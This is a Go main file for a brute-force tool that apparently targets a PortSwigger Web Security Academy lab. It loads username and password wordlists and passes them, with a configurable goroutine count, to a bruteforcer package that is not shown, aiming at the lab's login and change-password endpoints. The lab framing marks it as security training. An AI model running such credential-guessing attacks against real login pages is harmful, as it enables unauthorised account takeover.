package main

import (
	"flag"
	"fmt"
	"io"
	"log"
	"os"
	bruteforcer "portswinger/brute/bruteForcer"
)

// Set Up Url Var
var (
	urlPost           string = "https://0a8600e2032f14b4810d2a6300480015.web-security-academy.net/login"
	urlPostChangePass string = "https://0a8600e2032f14b4810d2a6300480015.web-security-academy.net/my-account/change-password"
)

func main() {

	//Flags for Number of goroutines
	threads := flag.Int("t", 1, "Number of GoRoutines to be executed")
	flag.Parse()

	if *threads < 1 {
		fmt.Println("Please Add Value to the -t flag -h for help")
	}

	//Open Credentials Word Lists
	usernameFile, err := os.OpenFile("./usernames.txt", os.O_RDONLY, 0644)
	if err != nil {
		log.Fatal("Did Not Found usernames.txt file")
	}

	passwordFile, err := os.OpenFile("./passwords.txt", os.O_RDONLY, 0644)
	if err != nil {
		log.Fatal("Did Not Found usernames.txt file")
	}

	usernames, err := io.ReadAll(usernameFile)
	if err != nil {
		log.Fatal("Did Not Found usernames.txt file")
	}

	passwords, err := io.ReadAll(passwordFile)
	if err != nil {
		log.Fatal("Did Not Found usernames.txt file")
	}

	//Run Brute Force Attack
	bruteforcer.BruteForcer(urlPost, &urlPostChangePass, usernames, passwords, threads)
}
